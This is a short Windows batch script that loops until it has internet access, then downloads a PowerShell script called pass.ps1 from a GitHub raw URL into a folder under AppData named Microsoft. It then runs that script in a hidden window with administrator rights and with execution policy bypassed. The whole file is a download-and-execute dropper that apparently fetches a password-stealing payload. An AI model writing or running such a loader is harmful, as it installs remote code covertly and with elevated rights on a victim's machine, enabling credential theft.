@echo off
:internet
ping -n 3 -w 700 google.com | find "bytes="
IF %ERRORLEVEL% EQU 0 ( goto run ) else ( goto internet )

:run
powershell -command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/4V4loon/tools/master/pass.ps1' -OutFile $env:appdata\Microsoft\pass.ps1"
timeout /t 20
powershell -command "start-process PowerShell.exe -ArgumentList 'Set-ExecutionPolicy -ExecutionPolicy Unrestricted; powershell -executionpolicy bypass -file $env:appdata\Microsoft\pass.ps1' -WindowStyle Hidden -Verb RunAs"
